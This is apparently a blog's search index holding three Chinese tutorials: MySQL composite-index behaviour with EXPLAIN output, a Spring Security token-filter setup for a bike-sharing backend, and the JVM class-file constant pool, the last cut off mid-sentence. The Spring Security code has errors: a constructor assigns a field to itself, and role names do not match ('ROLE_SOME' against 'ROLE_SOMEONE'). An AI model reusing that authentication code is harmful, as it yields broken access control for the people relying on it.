    <content type="text"><![CDATA[关于索引失效和联合索引. 索引失效 查询条件包含or 当or左右查询字段只有一个是索引，该索引失效，explain执行计划key=null；只有当or左右查询字段均为索引时，才会生效； 组合索引，不是使用第一列索引，索引失效 如果select * from key1=1 and key2= 2;建立组合索引（key1，key2）; select * from key1 = 1;组合索引有效； select * from key1 = 1 and key2= 2;组合索引有效； select * from key2 = 2;组合索引失效；不符合最左前缀原则 like 以%开头 使用like模糊查询，当%在前缀时，索引失效； 如何列类型是字符串，where时一定用引号括起来，否则索引失效 当全表扫描速度比索引速度快时，mysql会使用全表扫描，此时索引失效 最左前缀原则建立以下sql：123456789CREATE TABLE IF NOT EXISTS `test_index`( `id` int(4) NOT NULL AUTO_INCREMENT, `a` int(4) NOT NULL DEFAULT '0', `b` int(4) NOT NULL DEFAULT '0', `c` int(4) NOT NULL DEFAULT '0', `data` int(4) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `union_index` (`a`,`b`,`c`))ENGINE=InnoDB ROW_FORMAT=DYNAMIC DEFAULT CHARSET=binary; 测试的mysql版本是 5.7. 首先以列a作为条件查询数据，我们看到 type: ref 表示引用查找, key_len: 4 表示索引长度为4，也就是利用上了索引来进行查找: 123456789101112131415explain select data from test_index where a = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: refpossible_keys: union_index key: union_index key_len: 4 ref: const rows: 70 filtered: 100.00 Extra: NULL1 row in set, 1 warning (0.01 sec) 然后以列b作为条件查询数据，可以看到type: ALL表示全表查找, key_len: NULL 表示没有索引，也就说明如果只使用b作为查询条件，不能利用索引来加快查找速度. 123456789101112131415explain select data from test_index where b = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: ALLpossible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 716173 filtered: 10.00 Extra: Using where1 row in set, 1 warning (0.00 sec) 接着以列c作为条件查询数据，可以看到type: ALL表示全表查找, key_len: NULL 表示没有索引，情况与用b作为条件一样，只使用c作为查询条件也不能利用索引来加快查找速度 123456789101112131415explain select data from test_index where c = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: ALLpossible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 716173 filtered: 10.00 Extra: Using where1 row in set, 1 warning (0.00 sec) 现在来测一下使用a、b作为条件的情况，我们看到 type: ref 表示引用查找, key_len: 8 表示索引长度为8，也就是说我们利用上了a、b联合索引来进行查找 123456789101112131415explain select data from test_index where a = 1 and b = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: refpossible_keys: union_index key: union_index key_len: 8 ref: const,const rows: 1 filtered: 100.00 Extra: NULL1 row in set, 1 warning (0.00 sec) 紧接着来测一下使用a、c作为条件的情况，我们看到 type: ref 表示引用查找, key_len: 4 表示索引长度为4，这就奇怪了，按照最左原则来说，a、c上是不会建立索引的，为什么会有索引长度呢？其实与a、b上的索引一比较我们就能发现，a、c上的索引长度只有4，而且单独的c上是没有索引的，所以4字节长度的索引只能是a上的，也就是说这种情况我们只使用了a列上的索引来进行查找 123456789101112131415explain select data from test_index where a = 1 and c = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: refpossible_keys: union_index key: union_index key_len: 4 ref: const rows: 70 filtered: 10.00 Extra: Using index condition1 row in set, 1 warning (0.00 sec) 为了进一步验证上面的想法，这一次测一下使用b、c作为条件的情况，我们看到 type: ALL 表示全表查找, key_len: NULL 表示没有索引可以使用，按照最左原则来说，b列上没有索引，c列上也没有索引，同时b、c的上也不存在联合索引，所以使用b、c作为查询条件时无法利用联合索引 123456789101112131415explain select data from test_index where b = 1 and c = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: ALLpossible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 716173 filtered: 1.00 Extra: Using where1 row in set, 1 warning (0.00 sec) 测试完两个条件的情况，接下来测试一下使用a、b、c作为条件的情况，我们看到 type: ref 表示引用查找, key_len: 12 表示索引长度为12，这完全符合联合索引的最左原则，同时使用3个条件查询可以利用联合索引 123456789101112131415explain select data from test_index where a = 1 and b = 1 and c = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: refpossible_keys: union_index key: union_index key_len: 12 ref: const,const,const rows: 1 filtered: 100.00 Extra: NULL1 row in set, 1 warning (0.00 sec) 下面这种情况也能利用a、b上的联合索引，索引长度为8 123456789101112131415explain select data from test_index where b = 1 and a = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: refpossible_keys: union_index key: union_index key_len: 8 ref: const,const rows: 1 filtered: 100.00 Extra: NULL1 row in set, 1 warning (0.00 sec) 再来试试这种情况，按照最左原则，c上没有建立索引，a上有索引，c、a没有建立联合索引，所以只能使用a上的索引进行查找，结果索引长度只有4，验证了我们的想法，联合查询条件使用索引时满足“交换律” 123456789101112131415explain select data from test_index where c = 1 and a = 1*************************** 1. row *************************** id: 1select_type: SIMPLE table: test_indexpartitions: NULL type: refpossible_keys: union_index key: union_index key_len: 4 ref: const rows: 70 filtered: 10.00 Extra: Using index condition1 row in set, 1 warning (0.00 sec) 联合索引总结 联合索引的最左原则就是建立索引KEY union_index (a,b,c)时，等于建立了(a)、(a,b)、(a,b,c)三个索引，从形式上看就是索引向左侧聚集，所以叫做最左原则，因此最常用的条件应该放到联合索引的组左侧。 利用联合索引加速查询时，联合查询条件符合“交换律”，也就是where a = 1 and b = 1 等价于 where b = 1 and a = 1。这归功于mysql查询优化器，mysql查询优化器会判断纠正这条sql语句该以什么样的顺序执行效率最高，最后才生成真正的执行计划。 对于最左匹配原则的理解mysql索引最左匹配原则的理解?–沈杰的回答 其实我觉得只要理解一点就是，只要有最左边的索引元素，那么这个索引结构一定是按照最左索引元素排序的，后序的索引元素也是依赖于最左元素之后才有可能变得有意义。]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[六、整合springSecurity]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%AD%E3%80%81%E6%95%B4%E5%90%88springSecurity%2F</url>
    <content type="text"><![CDATA[整合springSecurity来实现简单的权限控制。 1、导入依赖：1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 2、配置拦截123456789101112131415@Configuration@EnableWebSecurity@EnableGlobalMethodSecurity(prePostEnabled = true)public class SecurityConfig extends WebSecurityConfigurerAdapter&#123; @Override protected void configure(HttpSecurity http) throws Exception &#123; http.csrf().disable() .authorizeRequests() .antMatchers("/**/login").permitAll() .anyRequest().authenticated() .and() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) ; &#125;&#125; 这里是先将csrf失效，本系统用不到防止表单攻击。允许login方法通过，其他的都需要授权才能通过。 我们会发现，当用postman发送 localhost:8888/user/modifyNickName返回信息是： 1234567&#123; &quot;timestamp&quot;: 1509024238618, &quot;status&quot;: 403, &quot;error&quot;: &quot;Forbidden&quot;, &quot;message&quot;: &quot;Access Denied&quot;, &quot;path&quot;: &quot;/user/modifyNickName&quot;&#125; 我们的访问被限制了，但是login是可以得。但是我们这里修改用户昵称的方法是携带token的，是属于授权用户，我们不应该粗暴地拦截，所以需要配置过滤器，让携带token的用户通过拦截。 3、自定义过滤器第一步就是来到这边，返回一个东西，这个东西会被后面的provider中的supports()方法拿到判断 123456789101112131415public class RestPreAuthenticatedProcessingFilter extends AbstractPreAuthenticatedProcessingFilter &#123; //获取用户信息 @Override protected Object getPreAuthenticatedPrincipal(HttpServletRequest httpServletRequest) &#123; System.out.println("111111"); return null; &#125; @Override protected Object getPreAuthenticatedCredentials(HttpServletRequest httpServletRequest) &#123; return null; &#125;&#125; 第二步如果返回了什么，就到provider中判断： 如果符合supports()，那么就会执行authenticate()验证权限 123456789101112131415public class RestAuthenticationProvider implements AuthenticationProvider &#123; @Override public Authentication authenticate(Authentication authentication) throws AuthenticationException &#123; System.out.println("33333"); return null; &#125; //filter有正确返回时才会返回true，只有返回true才会进一步验证上面一个验证权限的方法 @Override public boolean supports(Class&lt;?&gt; aClass) &#123; System.out.println("222222"); return false; &#125;&#125; 如果不符合，直接到异常处理： 123456public class RestAuthenticationEntryPoint implements AuthenticationEntryPoint &#123; @Override public void commence(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException &#123; System.out.println("44444"); &#125;&#125; securityConfig中配置过滤器，异常处理等： 12.and().httpBasic().authenticationEntryPoint(new RestAuthenticationEntryPoint()).and().addFilter(getPreAuthenticatedProcessingFilter()) 这里第一个是直接new一下统一异常处理的类，第二个是设置filter，但是注意，filter也要设置manager，因为manager中管理着provider，才能提供权限信息： 所以先把manager放到filer中： 12345private RestPreAuthenticatedProcessingFilter getPreAuthenticatedProcessingFilter() throws Exception &#123; RestPreAuthenticatedProcessingFilter filter = new RestPreAuthenticatedProcessingFilter(); filter.setAuthenticationManager(this.authenticationManager()); return filter;&#125; 然后把provider再放到manager中: 1234@Overrideprotected void configure(AuthenticationManagerBuilder auth) throws Exception &#123; auth.authenticationProvider(new RestAuthenticationProvider());&#125; 注意这里要设置一下放过option，这是跨域请求设置： 123456@Overridepublic void configure(WebSecurity web) throws Exception &#123; web.ignoring().antMatchers(HttpMethod.OPTIONS, "/**")//忽略 OPTIONS 方法的请求 .antMatchers("/v2/api-docs", "/configuration/ui", "/swagger-resources/**", "/configuration/**", "/swagger-ui.html", "/webjars/**"); //放过swagger&#125; 运行：访问localhost:8888/user/modifyNickName 内容还是修改昵称，头还加上token ,这个时候结果为空白，运行的过程是：先显示11111，后显示44444.显示11111表示进入了filter，因为现在是直接return null，所以肯定没有进入provider中，直接进入了异常处理中，所以显示44444 3、因为有一些url是不需要拦截的，所以在securityConfig配置中会有这样一句话： 1.antMatchers("/**/login").permitAll() 但是不利于扩展，因为不止一个这样的url，直接写死在这里不优雅，我们可以将这些url写进一个配置文件，读进去。以后修改的时候，直接在配置文件中修改即可。 首先是新建parameter.properties文件： 12#security无需拦截的urlsecurity.noneSecurityPath=/**/login,/**/regester,/**/sendVercode,/**/generateBike,/**/lockBike,/**/reportLocation,/**/swagger-ui.html 然后将其注入到程序中，即到Parameter中注入： 12@Value("#&#123;'$&#123;security.noneSecurityPath&#125;'.split(',')&#125;")private List&lt;String&gt; noneSecurityPath; 在主函数上注解让他跟随一起启动： 1@PropertySource(value="classpath:parameter.properties") 并且在主函数中也需要配置一下占位符问题： 1234@Beanpublic static PropertySourcesPlaceholderConfigurer propertyConfigInDev() &#123; return new PropertySourcesPlaceholderConfigurer();&#125; 下面就是将Parameter注入到securityConfig中，然后写进配置： 12@Autowiredprivate Parameters parameters; 1.antMatchers(parameters.getNoneSecurityPath().toArray(new String[parameters.getNoneSecurityPath().size()])).permitAll() 4、验证用户及权限首先是filter: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192@Slf4jpublic class RestPreAuthenticatedProcessingFilter extends AbstractPreAuthenticatedProcessingFilter &#123; /** * spring的路径匹配器 */ private AntPathMatcher matcher = new AntPathMatcher(); //不需要授权的路径和redis操作，用构造器的方式得到，因为这里还不能直接注入，只能在SecurityConfig中注入，可能原因是这里相对于spring是独立的东西。 private List&lt;String&gt; noneSecurityList; private CommonCacheUtil commonCacheUtil; public RestPreAuthenticatedProcessingFilter(List&lt;String&gt; noneSecurityPath, CommonCacheUtil commonCacheUtil) &#123; this.noneSecurityList = noneSecurityList; this.commonCacheUtil = commonCacheUtil; &#125; //获取用户信息 @Override protected Object getPreAuthenticatedPrincipal(HttpServletRequest request) &#123; //这里是定义一个长度为1的数组存放角色，将其放到自定义的token中，用于后面provider调用 GrantedAuthority[] authorities = new GrantedAuthority[1]; //url是直接放过的，角色赋予ROLE_SOME if(isNoneSecurity(request.getRequestURI().toString()) || "OPTIONS".equals(request.getMethod()))&#123; GrantedAuthority authority = new SimpleGrantedAuthority("ROLE_SOME"); authorities[0] = authority; return new RestAuthenticationToken(Arrays.asList(authorities)); &#125; //检查APP版本 String version = request.getHeader(Constants.REQUEST_VERSION_KEY); String token = request.getHeader(Constants.REQUEST_TOKEN_KEY); if (version == null) &#123; request.setAttribute("header-error", Constants.RESP_STATUS_BADREQUEST); &#125; //为空说明version是正常传过来的 if(request.getAttribute("header-error") == null)&#123; try&#123; if(!StringUtils.isBlank(token))&#123; UserElement ue = commonCacheUtil.getUserByToken(token); if(ue instanceof UserElement)&#123; //检查到token说明用户已经登录 授权给用户BIKE_CLIENT角色 允许访问 GrantedAuthority authority = new SimpleGrantedAuthority("BIKE_CLIENT"); authorities[0] = authority; RestAuthenticationToken authToken = new RestAuthenticationToken(Arrays.asList(authorities));\ //把用户信息存进去，防止provide中需要用 authToken.setUser(ue); return authToken; &#125;else &#123; //token不对 request.setAttribute("header-error", 401); &#125; &#125;else &#123; log.warn("Got no token from request header"); //token不存在 告诉移动端 登录 request.setAttribute("header-error", 401); &#125; &#125;catch (Exception e)&#123; log.error("fail to authenticate'",e); &#125; &#125; //其他的情况，不能return null。赋予ROLE_NONE角色 if(request.getAttribute("header-error") != null)&#123; //请求头有错误 随便给个角色 让逻辑继续 GrantedAuthority authority = new SimpleGrantedAuthority("ROLE_NONE"); authorities[0] = authority; &#125; RestAuthenticationToken authToken = new RestAuthenticationToken(Arrays.asList(authorities)); return authToken; &#125; private boolean isNoneSecurity(String uri) &#123; boolean result = false; if (this.noneSecurityList != null) &#123; for (String pattern : this.noneSecurityList) &#123; if (matcher.match(pattern, uri)) &#123; result = true; break; &#125; &#125; &#125; return result; &#125; @Override protected Object getPreAuthenticatedCredentials(HttpServletRequest httpServletRequest) &#123; return null; &#125;&#125; 自定义的token: 12345678910111213141516171819@Datapublic class RestAuthenticationToken extends AbstractAuthenticationToken &#123; //authorities就是用户的角色，可以继而验证到权限 public RestAuthenticationToken(Collection&lt;? extends GrantedAuthority&gt; authorities) &#123; super(authorities); &#125; private UserElement user; @Override public Object getCredentials() &#123; return null; &#125; @Override public Object getPrincipal() &#123; return null; &#125;&#125; 下面就是provide处理 1234567891011121314151617181920212223242526272829303132333435public class RestAuthenticationProvider implements AuthenticationProvider &#123; @Override public Authentication authenticate(Authentication authentication) throws AuthenticationException &#123; if (authentication instanceof PreAuthenticatedAuthenticationToken) &#123; PreAuthenticatedAuthenticationToken preAuth = (PreAuthenticatedAuthenticationToken) authentication; RestAuthenticationToken sysAuth = (RestAuthenticationToken) preAuth.getPrincipal(); if (sysAuth.getAuthorities() != null &amp;&amp; sysAuth.getAuthorities().size() &gt; 0) &#123; GrantedAuthority gauth = sysAuth.getAuthorities().iterator().next(); if ("BIKE_CLIENT".equals(gauth.getAuthority())) &#123; return sysAuth; &#125;else if ("ROLE_SOMEONE".equals(gauth.getAuthority())) &#123; return sysAuth; &#125; &#125; &#125;else if (authentication instanceof RestAuthenticationToken) &#123; RestAuthenticationToken sysAuth = (RestAuthenticationToken) authentication; if (sysAuth.getAuthorities() != null &amp;&amp; sysAuth.getAuthorities().size() &gt; 0) &#123; GrantedAuthority gauth = sysAuth.getAuthorities().iterator().next(); if ("BIKE_CLIENT".equals(gauth.getAuthority())) &#123; return sysAuth; &#125;else if ("ROLE_SOMEONE".equals(gauth.getAuthority())) &#123; return sysAuth; &#125; &#125; &#125; throw new BadCredentialException("unknown.error"); &#125; //filter有正确返回时才会返回true，只有返回true才会进一步验证上面一个验证权限的方法 @Override public boolean supports(Class&lt;?&gt; authentication) &#123; return PreAuthenticatedAuthenticationToken.class.isAssignableFrom(authentication)||RestAuthenticationToken.class.isAssignableFrom(authentication); &#125;&#125; 最后有一个统一的异常处理： 1234567891011121314151617181920212223242526272829@Slf4jpublic class RestAuthenticationEntryPoint implements AuthenticationEntryPoint &#123; @Override public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException e) throws IOException, ServletException &#123; ApiResult result = new ApiResult(); //检查头部错误 if (request.getAttribute("header-error") != null) &#123; if ("400".equals(request.getAttribute("header-error") + "")) &#123; result.setCode(408); result.setMessage("请升级至app最新版本"); &#125; else &#123; result.setCode(401); result.setMessage("请您登录"); &#125; &#125; try &#123; //设置跨域请求 请求结果json刷到响应里 response.setHeader("Access-Control-Allow-Origin", "*"); response.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE, HEADER"); response.setHeader("Access-Control-Max-Age", "3600"); response.setHeader("Access-Control-Allow-Headers", "X-Requested-With, user-token, Content-Type, Accept, version, type, platform"); response.setContentType(MediaType.APPLICATION_JSON_UTF8_VALUE); response.getWriter().write(JSON.toJSONString(result)); response.flushBuffer(); &#125; catch (Exception er) &#123; log.error("Fail to send 401 response &#123;&#125;", er.getMessage()); &#125; &#125;&#125; 这样权限验证就实现了。postsman测试：localhost:8888/user/modifyNickName当头不带user-token时： 1234&#123; &quot;code&quot;: 401, &quot;message&quot;: &quot;请您登录&quot;&#125; 当头不带version时： 1234&#123; &quot;code&quot;: 408, &quot;message&quot;: &quot;请升级至app最新版本&quot;&#125; 不错的话返回200码。]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[六、Class文件中的常量池]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%AD%E3%80%81Class%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%B8%B8%E9%87%8F%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[上一节Class类文件结构大致地介绍了class文件的组织结构，接下来，我们将深入每一个结构，来详细了解它们。这一章节呢，我们就来扒一扒 class文件中非常重要 的一个数据区域——常量池。它在JVM虚拟机中扮演了非常重要的地位。 本篇内容来自于java虚拟机原理图解，自己一边理解一边进行复制整理得此文章，也是看了很多遍，逐渐地好像懂了常量池怎么玩的，所以一定要坚持，读不懂多读几遍一定可以读懂的。 本篇文章内容过多，这里将目录列举在此。 常量池是什么 常量池在class文件的什么位置？ 常量池里面是怎么组织的？ 常量池项 (cp_info) 的结构是什么？ 常量池能够表示哪些信息？ int和float数据类型的常量在常量池中是怎样表示和存储的？ long和 double数据类型的常量在常量池中是怎样表示和存储的？ String类型的字符串常量在常量池中是怎样表示和存储的？ 类文件中定义的类名和类中使用到的类在常量池中是怎样被组织和存储的？ 类中引用到的field字段在常量池中是怎样描述的？ 类中引用到的method方法在常量池中是怎样描述的？ 类中引用到某个接口中定义的method方法在常量池中是怎样描述的？ 更好地支持动态语言所增加的三项 1. 常量池是什么可以理解为class文件之中的资源仓库，它是class文件结构中与其他项目关联最多的数据类型，也是占用class文件空间最大的数据项目之一，同时它还是class文件中第一个出现表类型的数据项目． 由于常量池的数量是不固定的，所以在常量池入口需要放置一项u2（即２个字节）类型的数据，代表常量池容量计数值（constant-pool-count）(从１开始，将０表示不引用任何常量). 常量池中主要存放两大类常量：字面量（Literal）和符号引用(Synbolic Reference)． 字面量：比较接近于Java语言层面的常量概念，如文本字符串，声明为final的常量值. 符号引用：包括如下三类常量： 类和接口的全限定名（Fully Qualified Name） 字段的名称和描述符（Descriptor） 方法的名称和描述符 2. 常量池在class文件的什么位置？ 3. 常量池的里面是怎么组织的？常量池的组织很简单，前端的两个字节占有的位置叫做常量池计数器(constant_pool_count)，它记录着常量池的组成元素 常量池项(cp_info) 的个数。紧接着会排列着constant_pool_count-1个常量池项(cp_info)。如下图所示： 4. 常量池项 (cp_info) 的结构是什么？每个常量池项(cp_info) 都会对应记录着class文件中的某种类型的字面量。让我们先来了解一下常量池项(cp_info)的结构吧： JVM虚拟机规定了不同的tag值和不同类型的字面量对应关系如下： 所以根据cp_info中的tag 不同的值，可以将cp_info 更细化为以下结构体： 现在让我们看一下细化了的常量池的结构会是类似下图所示的样子： 5. 常量池能够表示那些信息？ 6. int和float数据类型的常量在常量池中是怎样表示和存储的？(CONSTANT_Integer_info, CONSTANT_Float_info)Java语言规范规定了 int类型和Float 类型的数据类型占用 4 个字节的空间。那么存在于class字节码文件中的该类型的常量是如何存储的呢？相应地，在常量池中，将 int和Float类型的常量分别使用CONSTANT_Integer_info和 Constant_float_info表示，他们的结构如下所示： 举例：建下面的类 IntAndFloatTest.java，在这个类中，我们声明了五个变量，但是取值就两种int类型的10 和Float类型的11f. 123456789public class IntAndFloatTest &#123; private final int a = 10; private final int b = 10; private float c = 11f; private float d = 11f; private float e = 11f; &#125; 然后用编译器编译成IntAndFloatTest.class字节码文件，我们通过javap -v IntAndFloatTest 指令来看一下其常量池中的信息，可以看到虽然我们在代码中写了两次10 和三次11f，但是常量池中，就只有一个常量10 和一个常量11f,如下图所示: 从结果上可以看到常量池第#8 个常量池项(cp_info) 就是CONSTANT_Integer_info,值为10；第#23个常量池项(cp_info) 就是CONSTANT_Float_info,值为11f。 代码中所有用到 int 类型 10 的地方，会使用指向常量池的指针值#8 定位到第#8 个常量池项(cp_info)，即值为 10的结构体 CONSTANT_Integer_info，而用到float类型的11f时，也会指向常量池的指针值#23来定位到第#23个常量池项(cp_info) 即值为11f的结构体CONSTANT_Float_info。如下图所示： 7. long和 double数据类型的常量在常量池中是怎样表示和存储的？(CONSTANT_Long_info、CONSTANT_Double_info )Java语言规范规定了 long 类型和 double类型的数据类型占用8 个字节的空间。那么存在于class 字节码文件中的该类型的常量是如何存储的呢？相应地，在常量池中，将long和double类型的常量分别使用CONSTANT_Long_info和Constant_Double_info表示，他们的结构如下所示： 代码中所有用到 long 类型-6076574518398440533L 的地方，会使用指向常量池的指针值#18 定位到第 #18 个常量池项(cp_info)，即值为-6076574518398440533L 的结构体CONSTANT_Long_info，而用到double类型的10.1234567890D时，也会指向常量池的指针值#26 来定位到第 #26 个常量池项(cp_info) 即值为10.1234567890D的结构体CONSTANT_Double_info。如下图所示： 8. String类型的字符串常量在常量池中是怎样表示和存储的？（CONSTANT_String_info、CONSTANT_Utf8_info）对于字符串而言，JVM会将字符串类型的字面量以UTF-8 编码格式存储到在class字节码文件中。这么说可能有点摸不着北，我们先从直观的Java源码中中出现的用双引号”” 括起来的字符串来看，在编译器编译的时候，都会将这些字符串转换成CONSTANT_String_info结构体，然后放置于常量池中。其结构如下所示： 如上图所示的结构体，CONSTANT_String_info结构体中的string_index的值指向了CONSTANT_Utf8_info结构体，而字符串的utf-8编码数据就在这个结构体之中。如下图所示： 请看一例，定义一个简单的StringTest.java类，然后在这个类里加一个”JVM原理” 字符串，然后，我们来看看它在class文件中是怎样组织的。 123456public class StringTest &#123; private String s1 = "JVM原理"; private String s2 = "JVM原理"; private String s3 = "JVM原理"; private String s4 = "JVM原理"; &#125; 在上面的图中，我们可以看到CONSTANT_String_info结构体位于常量池的第#15个索引位置。而存放”Java虚拟机原理” 字符串的 UTF-8编码格式的字节数组被放到CONSTANT_Utf8_info结构体中，该结构体位于常量池的第#16个索引位置。上面的图只是看了个轮廓，让我们再深入地看一下它们的组织吧。请看下图： 9. 类文件中定义的类名和类中使用到的类在常量池中是怎样被组织和存储的？(CONSTANT_Class_info)JVM会将某个Java 类中所有使用到了的类的完全限定名 以二进制形式的完全限定名 封装成CONSTANT_Class_info结构体中，然后将其放置到常量池里。CONSTANT_Class_info 的tag值为 7 。其结构如下： 类的完全限定名和二进制形式的完全限定名 在某个Java源码中，我们会使用很多个类，比如我们定义了一个 ClassTest的类，并把它放到com.louis.jvm 包下，则 ClassTest类的完全限定名为com.louis.jvm.ClassTest，将JVM编译器将类编译成class文件后，此完全限定名在class文件中，是以二进制形式的完全限定名存储的，即它会把完全限定符的”.”换成”/“ ，即在class文件中存储的 ClassTest类的完全限定名称是”com/louis/jvm/ClassTest”。因为这种形式的完全限定名是放在了class二进制形式的字节码文件中，所以就称之为 二进制形式的完全限定名。 举例，我们定义一个很简单的ClassTest类，来看一下常量池是怎么对类的完全限定名进行存储的。 123public class ClassTest &#123; private Date date =new Date(); &#125; 如上图所示，在ClassTest.class文件的常量池中，共有 3 个CONSTANT_Class_info结构体，分别表示ClassTest 中用到的Class信息。 我们就看其中一个表示com/jvm.ClassTest的CONSTANT_Class_info 结构体。它在常量池中的位置是#1，它的name_index值为#2，它指向了常量池的第2 个常量池项，如下所示: 注意： 对于某个类而言，其class文件中至少要有两个CONSTANT_Class_info常量池项，用来表示自己的类信息和其父类信息。(除了java.lang.Object类除外，其他的任何类都会默认继承自java.lang.Object）如果类声明实现了某些接口，那么接口的信息也会生成对应的CONSTANT_Class_info常量池项。 除此之外，如果在类中使用到了其他的类，只有真正使用到了相应的类，JDK编译器才会将类的信息组成CONSTANT_Class_info常量池项放置到常量池中。如下： 12345678910import java.util.Date; public class Other&#123; private Date date; public Other() &#123; Date da; &#125; &#125; 上述的Other的类，在JDK将其编译成class文件时，常量池中并没有java.util.Date对应的CONSTANT_Class_info常量池项，为什么呢? 在Other类中虽然定义了Date类型的两个变量date、da，但是JDK编译的时候，认为你只是声明了“Ljava/util/Date”类型的变量，并没有实际使用到Ljava/util/Date类。将类信息放置到常量池中的目的，是为了在后续的代码中有可能会反复用到它。很显然，JDK在编译Other类的时候，会解析到Date类有没有用到，发现该类在代码中就没有用到过，所以就认为没有必要将它的信息放置到常量池中了。 将上述的Other类改写一下，仅使用new Date()，如下所示： 12345678import java.util.Date; public class Other&#123; public Other() &#123; new Date(); &#125; &#125; 总结： 对于某个类或接口而言，其自身、父类和继承或实现的接口的信息会被直接组装成CONSTANT_Class_info常量池项放置到常量池中； 类中或接口中使用到了其他的类，只有在类中实际使用到了该类时，该类的信息才会在常量池中有对应的CONSTANT_Class_info常量池项； 类中或接口中仅仅定义某种类型的变量，JDK只会将变量的类型描述信息以UTF-8字符串组成CONSTANT_Utf8_info常量池项放置到常量池中，上面在类中的private Date date;JDK编译器只会将表示date的数据类型的“Ljava/util/Date”字符串放置到常量池中。 10. 类中引用到的field字段在常量池中是怎样描述的？(CONSTANT_Fieldref_info, CONSTANT_Name_Type_info)一般而言，我们在定义类的过程中会定义一些 field 字段，然后会在这个类的其他地方（如方法中）使用到它。有可能我们在类的方法中只使用field字段一次，也有可能我们会在类定义的方法中使用它很多很多次。 举一个简单的例子，我们定一个叫Person的简单java bean，它有name和age两个field字段，如下所示： 1234567891011121314151617181920public class Person &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; &#125; 在上面定义的类中，我们在Person类中的一系列方法里，多次引用到namefield字段 和agefield字段，对于JVM编译器而言，name和age只是一个符号而已，并且它在由于它可能会在此类中重复出现多次，所以JVM把它当作常量来看待，将name和age以field字段常量的形式保存到常量池中。 将它name和age封装成 CONSTANT_Fieldref_info 常量池项，放到常量池中，在类中引用到它的地方，直接放置一个指向field字段所在常量池的索引。 上面的Person类，使用javap -v Person指令，查看class文件的信息，你会看到，在Person类中引用到age和namefield字段的地方，都是指向了常量池中age和namefield字段对应的常量池项中。表示field字段的常量池项叫做CONSTANT_Fieldref_info。 怎样描述某一个field字段的引用？ 实例解析： 现在，让我们来看一下Person类中定义的namefield字段在常量池中的表示。通过使用javap -v Person会查看到如下的常量池信息： 请读者看上图中namefield字段的数据类型，它在#6个常量池项，以UTF-8编码格式的字符串“Ljava/lang/String;” 表示，这表示着这个field 字段是java.lang.String 类型的。关于field字段的数据类型，class文件中存储的方式和我们在源码中声明的有些不一样。请看下图的对应关系： 注意： 如果我们在类中定义了field 字段，但是没有在类中的其他地方用到这些字段，它是不会被编译器放到常量池中的。 只有在类中的其他地方引用到了，才会将他放到常量池中。 11. 类中引用到的method方法在常量池中是怎样描述的？(CONSTANT_Methodref_info, CONSTANT_Name_Type_info)1. 举例还是以Person类为例。在Person类中，我们定义了setName(String name)、getName()、setAge(int age)、getAge()这些方法： 123456789101112131415161718192021public class Person &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; &#125; 虽然我们定义了方法，但是这些方法没有在类总的其他地方被用到（即没有在类中其他的方法中引用到），所以它们的方法引用信息并不会放到常量中。 现在我们在类中加一个方法 getInfo()，调用了getName()和getAge() 方法： 1234public String getInfo() &#123; return getName()+"\t"+getAge(); &#125; 这时候JVM编译器会将getName()和getAge()方法的引用信息包装成CONSTANT_Methodref_info结构体放入到常量池之中。 这里的方法调用的方式牵涉到Java非常重要的一个术语和机制，叫动态绑定。这个动态绑定问题以后在单独谈谈。 2. 表示一个方法引用 3. 方法描述符的组成 4. getName() 方法引用在常量池中的表示 12. 类中引用到某个接口中定义的method方法在常量池中是怎样描述的？(CONSTANT_InterfaceMethodref_info, CONSTANT_Name_Type_info)当我们在某个类中使用到了某个接口中的方法，JVM会将用到的接口中的方法信息方知道这个类的常量池中。比如我们定义了一个Worker接口，和一个Boss类，在Boss类中调用了Worker接口中的方法，这时候在Boss类的常量池中会有Worker接口的方法的引用表示。 12345public interface Worker&#123; public void work(); &#125; 12345678public class Boss &#123; public void makeMoney(Worker worker) &#123; worker.work(); &#125; &#125; 如上图所示，在Boss类的makeMoney()方法中调用了Worker接口的work()方法，机器指令是通过invokeinterface指令完成的，invokeinterface指令后面的操作数，是指向了Boss常量池中Worker接口的work()方法描述，表示的意思就是：“我要调用Worker接口的work()方法”。 Worker接口的work()方法引用信息，JVM会使用CONSTANT_InterfaceMethodref_info结构体来描述，CONSTANT_InterfaceMethodref_info定义如下： CONSTANT_InterfaceMethodref_info结构体和上面介绍的CONSTANT_Methodref_info 结构体很基本上相同，它们的不同点只有： CONSTANT_InterfaceMethodref_info 的tag 